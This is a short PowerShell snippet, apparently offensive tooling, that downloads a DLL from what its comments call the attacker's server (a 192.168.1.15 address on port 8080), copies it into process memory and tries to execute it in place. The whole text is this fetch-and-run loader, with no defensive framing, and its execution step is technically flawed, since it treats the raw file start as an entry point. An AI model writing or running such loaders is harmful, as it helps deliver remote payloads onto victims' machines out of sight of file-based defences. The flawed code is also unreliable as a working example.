# Load the compiled DLL into memory (hosted on the attacker's server)
$webClient = New-Object Net.WebClient
$dllBytes = $webClient.DownloadData("http://192.168.1.15:8080/mydll.dll")  # Use your compiled DLL

# Allocate memory for the DLL
$virtualAlloc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dllBytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($dllBytes, 0, $virtualAlloc, $dllBytes.Length)

# Execute the DLL (assuming it has an entry point like DllMain)
$entryPoint = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAlloc, [Action])
$entryPoint.Invoke()

